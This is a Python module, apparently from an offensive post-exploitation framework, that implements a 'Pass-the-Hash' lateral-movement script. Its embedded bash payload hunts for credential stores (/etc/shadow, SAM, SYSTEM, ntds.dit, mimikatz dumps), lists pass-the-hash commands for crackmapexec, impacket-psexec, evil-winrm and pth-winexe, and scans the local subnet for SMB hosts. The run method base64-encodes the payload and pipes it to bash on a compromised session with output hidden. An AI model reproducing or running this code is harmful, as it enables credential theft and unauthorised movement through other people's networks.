"""Pass-the-hash attack implementation script."""

from ..base import OperatorScript, ScriptResult


class PassTheHash(OperatorScript):
    """Extract NTLM hashes and perform pass-the-hash attacks."""
    
    name = "Pass-the-Hash"
    description = "Extract NTLM hashes and perform pass-the-hash attacks"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] PASS-THE-HASH PREPARATION"
echo "============================="
echo ""

echo "[+] Checking for required tools:"
command -v pth-winexe &>/dev/null && echo "[+] pth-winexe available"
command -v crackmapexec &>/dev/null && echo "[+] crackmapexec available"
command -v impacket-psexec &>/dev/null && echo "[+] impacket-psexec available"
command -v evil-winrm &>/dev/null && echo "[+] evil-winrm available"
echo ""

echo "[+] Searching for cached password hashes:"
if [ -f /etc/shadow ]; then
    echo "[!] Found /etc/shadow"
    ls -la /etc/shadow
    head -5 /etc/shadow 2>/dev/null || echo "[-] Cannot read /etc/shadow"
else
    echo "[-] /etc/shadow not found"
fi
echo ""

echo "[+] Searching for Windows SAM database:"
find / -name "SAM" -o -name "SYSTEM" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
done
echo ""

echo "[+] Searching for NTDS.dit (Active Directory database):"
find / -name "ntds.dit" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    ls -la "$file"
done
echo ""

echo "[+] Checking for mimikatz dumps or hash files:"
find /tmp /home /root -name "*hash*" -o -name "*ntlm*" -o -name "*mimikatz*" 2>/dev/null | head -20
echo ""

echo "[+] Example pass-the-hash commands:"
echo ""
echo "  Using crackmapexec:"
echo "    crackmapexec smb TARGET -u USER -H HASH"
echo ""
echo "  Using impacket psexec:"
echo "    impacket-psexec -hashes :NTLM_HASH USER@TARGET"
echo ""
echo "  Using evil-winrm:"
echo "    evil-winrm -i TARGET -u USER -H HASH"
echo ""
echo "  Using pth-winexe:"
echo "    pth-winexe -U DOMAIN/USER%HASH //TARGET cmd"
echo ""

echo "[+] Network targets for pass-the-hash:"
LOCAL_NET=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3).0/24
if command -v nmap &>/dev/null; then
    echo "[*] Scanning for SMB hosts: $LOCAL_NET"
    nmap -p 445 --open -T4 $LOCAL_NET 2>/dev/null | grep "Nmap scan\|445/tcp"
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Preparing pass-the-hash attack...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="Pass-the-hash preparation executed",
                metadata={"script": "pass_the_hash"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
